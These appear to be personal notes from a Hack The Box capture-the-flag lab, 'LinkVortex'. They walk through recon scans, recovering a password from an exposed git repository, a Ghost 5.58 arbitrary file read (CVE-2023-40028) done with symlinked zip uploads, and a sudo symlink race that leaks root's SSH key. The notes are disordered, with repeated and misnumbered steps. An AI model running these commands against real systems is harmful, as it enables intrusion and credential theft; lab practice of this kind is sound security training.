HTB
LINKVORTEX
LINUX
EASY

IP: 10.129.231.194

## Step 1:    Quick and dirty scan
nmap -v -T4 --top-ports 20 -oG scan1.txt linkvortex.htb
nmap -v -sS -sC -sV -A -T5 -p 1-1000 -oN scan2.txt linkvortex.htb
nmap -v -sS -sC -sV -A -T5 -p 1001-5000 -oN scan3.txt linkvortex.htb
nmap -v -sS -sC -sB -A -T5 -p 5001-10000 -oN scan4.txt linkvortex.htb
nmap -v -sS -sC -sV -A -T5 -p 10001-65535 -oN scan5.txt linkvortex.htb

22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd

## Steo 2: Whatweb
whatweb -a 3 -v --log-json=whatweb.json http://linkvortex.htb

JQUERY 3.5.1
GHOST 5.58
APACHE

## Step 3: VHOST 

ffuf -u http://IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.permx.htb" -fc 301,302

dev.linkvortex.htb

## Step 4: Dirscan

ffuf -o dirs.json -u http://dev.linkvortex.htb/FUZZ/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -t 200 -v -c
"http://dev.linkvortex.htb/.git/logs//"
"http://dev.linkvortex.htb/.git/"

## Step 5: Git dump
git-dumper http://dev.linkvortex.htb/.git gitrepo

cd gitrepo
git status
git diff --cached ghost/core/test/regression/api/admin/authentication.test.js

-            const password = 'thisissupersafe';
+            const password = 'OctopiFociPilfer45';


## Step 6: Try Ghost login

http://linkvortex.htb/ghost

admin@linkvortex.htb
OctopiFociPilfer45

## Step 7: (foothold) CVE-2023-40028 Explanation
CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2023-40028
FIX: https://github.com/TryGhost/Ghost/releases?page=17

mkdir new old
wget $(npm view @tryghost/zip@1.1.34 dist.tarball)
wget $(npm view @tryghost/zip@1.1.37 dist.tarball)
tar xvfz zip-1.1.34.tgz -C old
tar xvfz zip-1.1.37.tgz -C new
diff -r old new

Diff shows the following:
    - install hook that gets called for each entry
    - check if entry is symlink and if so, throw an error

Conclusion: We can try to exploit invalid links. Let's see how this looks in practice


## Step 7: (foothold) CVE-2023-40028 PoC

Grab:
https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028

Run:
./cve.sh  -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb

Grab file 
Read config file /var/lib/ghost/config.production.json
        "user": "bob@linkvortex.htb",                                                      │
        "pass": "fibber-talented-worth" 

ssh bob@linkvortex.htb

## Step 8: Escalation - reccon

bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh 
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi


bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png


## Step 9 - Escalation - exploitation

At this point we have everything we need.

Open a second terminal:
while true; do rm /var/quarantined/exploit.png && ln -s /root/.ssh/id_rsa /var/quarantined/exploit.png; done

In another terminal:
ln -s /dev/null exploit.png
sudo /usr/bin/bash /opt/ghost/clean_symlink.sh exploit.png

At this point you should see a key pop onto your screen
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
ICLgLxRR4sAx0AAAAPcm9vdEBsaW5rdm9ydGV4AQIDBA==
-----END OPENSSH PRIVATE KEY-----

Copy it to your own system as id_bob

Then: ssh -i id_bob root@linkvortex.htb

Flag is in /root/root.txt





## Step 8: Crafting an exploit

1. The only place to upload - labs
2. What is the format?

mkdir -p exploit/content/images/2024
ln -s /etc/passwd exploit/content/images/2024/file.txt
zip -r -y exploit.zip exploit/
*upload*
curl http://linkvortex.htb/content/images/2024/file.txt

LOGGING IN:
DOC ghost api: 
    - user auth: https://ghost.org/docs/admin-api/#user-authentication

Login api:
export COOKIE=$(curl -d "username=admin@linkvortex.htb&password=OctopiFociPilfer45" -X POST http://linkvortex.htb/ghost/api/admin/session -v)

Test api to create a post (easy to verify):
curl -b "$COOKIE" -H "Content-Type: application/json"  -H "Origin: $GHOST_URL"  -H "Referer: $GHOST_URL/ghost" --data @post.json -X POST http://linkvortex.htb/ghost/api/admin/posts -v

Upload an image:
curl -X POST -F 'file=@PNG.png' -F 'ref=PNG.png' -H "Authorization: 'Ghost $token'" -H "Accept-Version: 5.58" https://linkvortex.htb/ghost/api/admin/images/upload/
curl -b "$COOKIE" -X POST -F 'file=@PNG.png' -F 'ref=PNG.png' -H "Accept-Version: 5.58" http://linkvortex.htb/ghost/api/admin/images/upload/

Try uploading file - but where does it upload?




## Step 2:    Web source code review

Ghost version: 5.58

## Step 3: Whatweb
## Step 4: WPScan (skip)
### Results:
1. dev


## Step 5: Dir scan

Candidates:
/ghost/
/assets
/assets/built
/public
/webmentions/receive/
/storage-drive/
/psu
/vga
/ram
/cmos
/cpu
/storage-drive
/about
/author/admin
/rss
/ghost
/p
/email
/r

dev.linkvortex.htb:
    - /.git/
    - /.git/logs

## Step 5.8

git: dev@linkvortex.htb

## Step 5.9
git-dumper http://
git log
password OctopiFociPilfer45

go back to main server /ghost
guess user name and discover admin/Octopi... works.

Now use CVE-2023-40028

Read config file /var/lib/ghost/config.production.json
        "user": "bob@linkvortex.htb",                                                      │
        "pass": "fibber-talented-worth" 



## Step 6: Bruteforce login
http://linkvortex.htb/ghost/#/signin

# FACTS

## Open Ports
22 - OpenSSH 8.9p1
80 - Apache?
        JQUERY 3.5.1
        GHOST 5.58


## Domains
linkvortex.htb
dev.linkvortex.htb

## Passwords
-            const password = 'thisissupersafe';
+            const password = 'OctopiFociPilfer45';

